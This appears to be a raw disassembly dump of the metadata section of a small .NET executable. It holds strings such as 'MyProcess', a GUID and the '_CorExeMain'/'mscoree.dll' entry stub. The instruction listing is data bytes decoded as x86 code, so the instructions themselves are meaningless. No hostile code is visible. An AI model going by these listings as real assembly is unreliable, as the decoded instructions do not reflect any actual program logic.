  40b2fa:	06                   	push   %es
  40b2fb:	00 01                	add    %al,(%ecx)
  40b2fd:	12 81 95 0e 06 00    	adc    0x60e95(%ecx),%al
  40b303:	02 01                	add    (%ecx),%al
  40b305:	0e                   	push   %cs
  40b306:	1d 05 06 20 03       	sbb    $0x3200605,%eax
  40b30b:	01 0e                	add    %ecx,(%esi)
  40b30d:	0e                   	push   %cs
  40b30e:	02 05 20 00 12 81    	add    0x81120020,%al
  40b314:	99                   	cltd
  40b315:	06                   	push   %es
  40b316:	00 03                	add    %al,(%ebx)
  40b318:	1c 0e                	sbb    $0xe,%al
  40b31a:	0e                   	push   %cs
  40b31b:	1c 05                	sbb    $0x5,%al
  40b31d:	20 00                	and    %al,(%eax)
  40b31f:	12 81 3d 03 20 00    	adc    0x20033d(%ecx),%al
  40b325:	1c 05                	sbb    $0x5,%al
  40b327:	20 00                	and    %al,(%eax)
  40b329:	12 81 a5 06 00 01    	adc    0x10006a5(%ecx),%al
  40b32f:	11 81 ad 0e 06 00    	adc    %eax,0x60ead(%ecx)
  40b335:	03 01                	add    (%ecx),%eax
  40b337:	0e                   	push   %cs
  40b338:	0e                   	push   %cs
  40b339:	1c 80                	sbb    $0x80,%al
  40b33b:	82 07 3e             	addb   $0x3e,(%edi)
  40b33e:	12 3c 1c             	adc    (%esp,%ebx,1),%bh
  40b341:	05 02 0e 12 81       	add    $0x81120e02,%eax
  40b346:	1d 1c 12 80 91       	sbb    $0x9180121c,%eax
  40b34b:	12 80 91 12 31 12    	adc    0x12311291(%eax),%al
  40b351:	80 91 12 80 91 0e 12 	adcb   $0x12,0xe918012(%ecx)
  40b358:	31 12                	xor    %edx,(%edx)
  40b35a:	80 91 0e 12 81 21 12 	adcb   $0x12,0x2181120e(%ecx)
  40b361:	21 12                	and    %edx,(%edx)
  40b363:	81 25 11 81 29 11 81 	andl   $0x121c2981,0x11298111
  40b36a:	29 1c 12 
  40b36d:	80 91 1c 12 80 91 12 	adcb   $0x12,-0x6e7fede4(%ecx)
  40b374:	80 91 12 80 91 12 80 	adcb   $0x80,0x12918012(%ecx)
  40b37b:	91                   	xchg   %eax,%ecx
  40b37c:	12 80 91 12 80 91    	adc    -0x6e7fed6f(%eax),%al
  40b382:	1c 0e                	sbb    $0xe,%al
  40b384:	12 80 91 0e 12 80    	adc    -0x7fedf16f(%eax),%al
  40b38a:	91                   	xchg   %eax,%ecx
  40b38b:	0e                   	push   %cs
  40b38c:	1d 1c 1d 1c 1d       	sbb    $0x1d1c1d1c,%eax
  40b391:	02 1d 0e 08 1d 0e    	add    0xe1d080e,%bl
  40b397:	08 11                	or     %dl,(%ecx)
  40b399:	81 2d 11 3d 11 81 31 	subl   $0x31811131,0x81113d11
  40b3a0:	11 81 31 
  40b3a3:	12 81 35 11 81 39    	adc    0x39811135(%ecx),%al
  40b3a9:	08 1d 12 31 0e 0e    	or     %bl,0xe0e3112
  40b3af:	08 1d 0e 08 1d 0e    	or     %bl,0xe1d080e
  40b3b5:	12 81 3d 1d 0e 08    	adc    0x80e1d3d(%ecx),%al
  40b3bb:	1d 0e 08 09 07       	sbb    $0x709080e,%eax
  40b3c0:	05 02 08 0e 12       	add    $0x120e0802,%eax
  40b3c5:	80 91 0e 06 20 00 1d 	adcb   $0x1d,0x20060e(%ecx)
  40b3cc:	12 81 b1 0f 07 06    	adc    0x6070fb1(%ecx),%al
  40b3d2:	12 81 b1 1c 0e 12    	adc    0x120e1cb1(%ecx),%al
  40b3d8:	81 b1 08 1d 12 81 b1 	xorl   $0x12007b1,-0x7eede2f8(%ecx)
  40b3df:	07 20 01 
  40b3e2:	1d 12 80 8d 0e       	sbb    $0xe8d8012,%eax
  40b3e7:	10 07                	adc    %al,(%edi)
  40b3e9:	07                   	pop    %es
  40b3ea:	12 81 b1 1c 0e 12    	adc    0x120e1cb1(%ecx),%al
  40b3f0:	80 8d 08 1d 12 80 8d 	orb    $0x8d,-0x7fede2f8(%ebp)
  40b3f7:	0a 0a                	or     (%edx),%cl
  40b3f9:	20 00                	and    %al,(%eax)
  40b3fb:	15 12 81 c5 01       	adc    $0x1c58112,%eax
  40b400:	12 81 b9 08 15 12    	adc    0x121508b9(%ecx),%al
  40b406:	81 c5 01 12 81 b9    	add    $0xb9811201,%ebp
  40b40c:	09 20                	or     %esp,(%eax)
  40b40e:	00 15 12 81 bd 01    	add    %dl,0x1bd8112
  40b414:	13 00                	adc    (%eax),%eax
  40b416:	08 15 12 81 bd 01    	or     %dl,0x1bd8112
  40b41c:	12 81 b9 05 20 00    	adc    0x2005b9(%ecx),%al
  40b422:	11 81 c1 07 00 04    	adc    %eax,0x40007c1(%ecx)
  40b428:	0e                   	push   %cs
  40b429:	0e                   	push   %cs
  40b42a:	0e                   	push   %cs
  40b42b:	0e                   	push   %cs
  40b42c:	0e                   	push   %cs
  40b42d:	12 07                	adc    (%edi),%al
  40b42f:	05 0e 0e 12 81       	add    $0x81120e0e,%eax
  40b434:	b9 15 12 81 bd       	mov    $0xbd811215,%ecx
  40b439:	01 12                	add    %edx,(%edx)
  40b43b:	81 b9 11 81 c1 0c 07 	cmpl   $0x121c0507,0xcc18111(%ecx)
  40b442:	05 1c 12 
  40b445:	80 91 1d 1c 1d 1c 1d 	adcb   $0x1d,0x1c1d1c1d(%ecx)
  40b44c:	02 0e                	add    (%esi),%cl
  40b44e:	01 00                	add    %eax,(%eax)
  40b450:	09 4d 79             	or     %ecx,0x79(%ebp)
  40b453:	50                   	push   %eax
  40b454:	72 6f                	jb     0x40b4c5
  40b456:	63 65 73             	arpl   %esp,0x73(%ebp)
  40b459:	73 00                	jae    0x40b45b
  40b45b:	00 06                	add    %al,(%esi)
  40b45d:	20 01                	and    %al,(%ecx)
  40b45f:	01 11                	add    %edx,(%ecx)
  40b461:	81 d5 01 22 04 07    	adc    $0x7042201,%ebp
  40b467:	01 1d 0e 05 00 00    	add    %ebx,0x50e
  40b46d:	12 81 d9 05 20 01    	adc    0x12005d9(%ecx),%al
  40b473:	1d 05 0e 04 07       	sbb    $0x7040e05,%eax
  40b478:	01 1d 05 05 20 01    	add    %ebx,0x1200505
  40b47e:	0e                   	push   %cs
  40b47f:	1d 05 03 00 00       	sbb    $0x305,%eax
  40b484:	08 05 07 02 0e 1d    	or     %al,0x1d0e0207
  40b48a:	1c 06                	sbb    $0x6,%al
  40b48c:	20 01                	and    %al,(%ecx)
  40b48e:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40b493:	20 01                	and    %al,(%ecx)
  40b495:	12 81 e1 0e 05 20    	adc    0x20050ee1(%ecx),%al
  40b49b:	02 0e                	add    (%esi),%cl
  40b49d:	08 08                	or     %cl,(%eax)
  40b49f:	0f 07                	sysret
  40b4a1:	07                   	pop    %es
  40b4a2:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40b4a7:	dd 12                	fstl   (%edx)
  40b4a9:	81 e1 05 08 1d 05    	and    $0x51d0805,%ecx
  40b4af:	06                   	push   %es
  40b4b0:	07                   	pop    %es
  40b4b1:	02 1c 12             	add    (%edx,%edx,1),%bl
  40b4b4:	80 91 03 07 01 1c 07 	adcb   $0x7,0x1c010703(%ecx)
  40b4bb:	00 01                	add    %al,(%ecx)
  40b4bd:	12 81 ed 1d 05 06    	adc    0x6051ded(%ecx),%al
  40b4c3:	20 00                	and    %al,(%eax)
  40b4c5:	1d 12 81 e9 05       	sbb    $0x5e98112,%eax
  40b4ca:	20 00                	and    %al,(%eax)
  40b4cc:	1d 12 15 04 20       	sbb    $0x20041512,%eax
  40b4d1:	01 02                	add    %eax,(%edx)
  40b4d3:	0e                   	push   %cs
  40b4d4:	05 20 00 12 81       	add    $0x81120020,%eax
  40b4d9:	ed                   	in     (%dx),%eax
  40b4da:	04 20                	add    $0x20,%al
  40b4dc:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40b4df:	11 07                	adc    %eax,(%edi)
  40b4e1:	07                   	pop    %es
  40b4e2:	12 81 e9 1c 12 15    	adc    0x15121ce9(%ecx),%al
  40b4e8:	08 1d 12 81 e9 08    	or     %bl,0x8e98112
  40b4ee:	1d 12 15 05 20       	sbb    $0x20051512,%eax
  40b4f3:	01 01                	add    %eax,(%ecx)
  40b4f5:	1d 05 06 20 01       	sbb    $0x1200605,%eax
  40b4fa:	01 11                	add    %edx,(%ecx)
  40b4fc:	81 fd 05 20 00 12    	cmp    $0x12002005,%ebp
  40b502:	81 f5 08 20 03 1d    	xor    $0x1d032008,%ebp
  40b508:	05 1d 05 08 08       	add    $0x808051d,%eax
  40b50d:	12 07                	adc    (%edi),%al
  40b50f:	06                   	push   %es
  40b510:	12 81 f1 1d 05 12    	adc    0x12051df1(%ecx),%al
  40b516:	81 dd 1d 05 12 81    	sbb    $0x8112051d,%ebp
  40b51c:	f5                   	cmc
  40b51d:	12 80 91 0c 07 04    	adc    0x4070c91(%eax),%al
  40b523:	0e                   	push   %cs
  40b524:	12 80 8d 12 80 91    	adc    -0x6e7fed73(%eax),%al
  40b52a:	11 81 39 06 07 02    	adc    %eax,0x2070639(%ecx)
  40b530:	0e                   	push   %cs
  40b531:	12 80 91 05 00 00    	adc    0x591(%eax),%al
  40b537:	12 82 01 06 20 01    	adc    0x1200601(%edx),%al
  40b53d:	01 12                	add    %edx,(%edx)
  40b53f:	82 01 06             	addb   $0x6,(%ecx)
  40b542:	20 01                	and    %al,(%ecx)
  40b544:	02 11                	add    (%ecx),%dl
  40b546:	82 09 07             	orb    $0x7,(%ecx)
  40b549:	07                   	pop    %es
  40b54a:	03 0e                	add    (%esi),%ecx
  40b54c:	12 80 91 02 07 07    	adc    0x7070291(%eax),%al
  40b552:	03 0e                	add    (%esi),%ecx
  40b554:	0e                   	push   %cs
  40b555:	12 80 91 05 20 00    	adc    0x200591(%eax),%al
  40b55b:	12 82 15 05 20 00    	adc    0x200515(%edx),%al
  40b561:	12 82 19 05 20 00    	adc    0x200519(%edx),%al
  40b567:	12 82 11 12 07 06    	adc    0x6071211(%edx),%al
  40b56d:	0e                   	push   %cs
  40b56e:	12 82 0d 12 81 e1    	adc    -0x1e7eedf3(%edx),%al
  40b574:	12 82 11 12 80 91    	adc    -0x6e7fedef(%edx),%al
  40b57a:	12 82 19 07 20 03    	adc    0x3200719(%edx),%al
  40b580:	01 02                	add    %eax,(%edx)
  40b582:	0e                   	push   %cs
  40b583:	10 02                	adc    %al,(%edx)
  40b585:	04 07                	add    $0x7,%al
  40b587:	02 02                	add    (%edx),%al
  40b589:	02 05 07 02 1c 12    	add    0x121c0207,%al
  40b58f:	39 04 20             	cmp    %eax,(%eax,%eiz,1)
  40b592:	01 08                	add    %ecx,(%eax)
  40b594:	08 0a                	or     %cl,(%edx)
  40b596:	20 04 08             	and    %al,(%eax,%ecx,1)
  40b599:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  40b59e:	80 e1 0c             	and    $0xc,%cl
  40b5a1:	07                   	pop    %es
  40b5a2:	05 1d 05 0e 12       	add    $0x120e051d,%eax
  40b5a7:	1d 12 80 91 1d       	sbb    $0x1d918012,%eax
  40b5ac:	0e                   	push   %cs
  40b5ad:	08 00                	or     %al,(%eax)
  40b5af:	01 12                	add    %edx,(%edx)
  40b5b1:	82 29 12             	subb   $0x12,(%ecx)
  40b5b4:	81 81 06 00 01 12 82 	addl   $0x3182982,0x12010006(%ecx)
  40b5bb:	29 18 03 
  40b5be:	20 00                	and    %al,(%eax)
  40b5c0:	18 05 00 00 12 81    	sbb    %al,0x81120000
  40b5c6:	59                   	pop    %ecx
  40b5c7:	05 00 00 11 81       	add    $0x81110000,%eax
  40b5cc:	31 08                	xor    %ecx,(%eax)
  40b5ce:	20 02                	and    %al,(%edx)
  40b5d0:	01 11                	add    %edx,(%ecx)
  40b5d2:	81 31 11 3d 09 20    	xorl   $0x20093d11,(%ecx)
  40b5d8:	02 01                	add    (%ecx),%al
  40b5da:	12 82 29 11 81 2d    	adc    0x2d811129(%edx),%al
  40b5e0:	07                   	pop    %es
  40b5e1:	00 02                	add    %al,(%edx)
  40b5e3:	02 11                	add    (%ecx),%dl
  40b5e5:	3d 11 3d 08 20       	cmp    $0x20083d11,%eax
  40b5ea:	02 01                	add    (%ecx),%al
  40b5ec:	12 81 81 11 3d 04    	adc    0x43d1181(%ecx),%al
  40b5f2:	06                   	push   %es
  40b5f3:	12 82 31 07 20 02    	adc    0x2200731(%edx),%al
  40b5f9:	01 12                	add    %edx,(%edx)
  40b5fb:	82 31 0a             	xorb   $0xa,(%ecx)
  40b5fe:	06                   	push   %es
  40b5ff:	20 00                	and    %al,(%eax)
  40b601:	1d 12 82 21 0b       	sbb    $0xb218212,%eax
  40b606:	20 03                	and    %al,(%ebx)
  40b608:	01 12                	add    %edx,(%edx)
  40b60a:	80 f5 12             	xor    $0x12,%ch
  40b60d:	41                   	inc    %ecx
  40b60e:	12 82 25 39 07 16    	adc    0x16073925(%edx),%al
  40b614:	08 12                	or     %dl,(%edx)
  40b616:	81 25 11 81 2d 11 81 	andl   $0x41122d81,0x112d8111
  40b61d:	2d 12 41 
  40b620:	12 82 21 12 82 25    	adc    0x25821221(%edx),%al
  40b626:	12 82 29 12 82 29    	adc    0x29821229(%edx),%al
  40b62c:	12 21                	adc    (%ecx),%ah
  40b62e:	11 81 31 12 81 59    	adc    %eax,0x59811231(%ecx)
  40b634:	12 82 29 11 3d 12    	adc    0x123d1129(%edx),%al
  40b63a:	80 91 12 80 91 1c 12 	adcb   $0x12,0x1c918012(%ecx)
  40b641:	21 12                	and    %edx,(%edx)
  40b643:	80 91 11 81 2d 12 1d 	adcb   $0x1d,0x122d8111(%ecx)
  40b64a:	02 05 00 00 1d 12    	add    0x121d0000,%al
  40b650:	41                   	inc    %ecx
  40b651:	0b 07                	or     (%edi),%eax
  40b653:	06                   	push   %es
  40b654:	08 12                	or     %dl,(%edx)
  40b656:	41                   	inc    %ecx
  40b657:	1d 12 41 08 08       	sbb    $0x8084112,%eax
  40b65c:	08 08                	or     %cl,(%eax)
  40b65e:	01 00                	add    %eax,(%eax)
  40b660:	08 00                	or     %al,(%eax)
  40b662:	00 00                	add    %al,(%eax)
  40b664:	00 00                	add    %al,(%eax)
  40b666:	1e                   	push   %ds
  40b667:	01 00                	add    %eax,(%eax)
  40b669:	01 00                	add    %eax,(%eax)
  40b66b:	54                   	push   %esp
  40b66c:	02 16                	add    (%esi),%dl
  40b66e:	57                   	push   %edi
  40b66f:	72 61                	jb     0x40b6d2
  40b671:	70 4e                	jo     0x40b6c1
  40b673:	6f                   	outsl  %ds:(%esi),(%dx)
  40b674:	6e                   	outsb  %ds:(%esi),(%dx)
  40b675:	45                   	inc    %ebp
  40b676:	78 63                	js     0x40b6db
  40b678:	65 70 74             	gs jo  0x40b6ef
  40b67b:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40b682:	77 73                	ja     0x40b6f7
  40b684:	01 29                	add    %ebp,(%ecx)
  40b686:	01 00                	add    %eax,(%eax)
  40b688:	24 66                	and    $0x66,%al
  40b68a:	64 34 66             	fs xor $0x66,%al
  40b68d:	33 62 66             	xor    0x66(%edx),%esp
  40b690:	65 2d 35 32 32 64    	gs sub $0x64323235,%eax
  40b696:	2d 34 62 30 62       	sub    $0x62306234,%eax
  40b69b:	2d 61 64 34 32       	sub    $0x32346461,%eax
  40b6a0:	2d 61 36 31 64       	sub    $0x64313661,%eax
  40b6a5:	34 33                	xor    $0x33,%al
  40b6a7:	38 34 63             	cmp    %dh,(%ebx,%eiz,2)
  40b6aa:	63 35 66 00 00 0c    	arpl   %esi,0xc000066
  40b6b0:	01 00                	add    %eax,(%eax)
  40b6b2:	07                   	pop    %es
  40b6b3:	31 2e                	xor    %ebp,(%esi)
  40b6b5:	30 2e                	xor    %ch,(%esi)
  40b6b7:	30 2e                	xor    %ch,(%esi)
  40b6b9:	30 00                	xor    %al,(%eax)
  40b6bb:	00 e4                	add    %ah,%ah
  40b6bd:	b6 00                	mov    $0x0,%dh
	...
  40b6c7:	00 fe                	add    %bh,%dh
  40b6c9:	b6 00                	mov    $0x0,%dh
  40b6cb:	00 00                	add    %al,(%eax)
  40b6cd:	20 00                	and    %al,(%eax)
	...
  40b6e3:	00 f0                	add    %dh,%al
  40b6e5:	b6 00                	mov    $0x0,%dh
	...
  40b6ef:	00 00                	add    %al,(%eax)
  40b6f1:	00 5f 43             	add    %bl,0x43(%edi)
  40b6f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6f5:	72 45                	jb     0x40b73c
  40b6f7:	78 65                	js     0x40b75e
  40b6f9:	4d                   	dec    %ebp
  40b6fa:	61                   	popa
  40b6fb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40b702:	72 65                	jb     0x40b769
  40b704:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40b708:	6c                   	insb   (%dx),%es:(%edi)
  40b709:	00 00                	add    %al,(%eax)
  40b70b:	00 00                	add    %al,(%eax)
  40b70d:	00 ff                	add    %bh,%bh
  40b70f:	25 00 20 40 00       	and    $0x402000,%eax
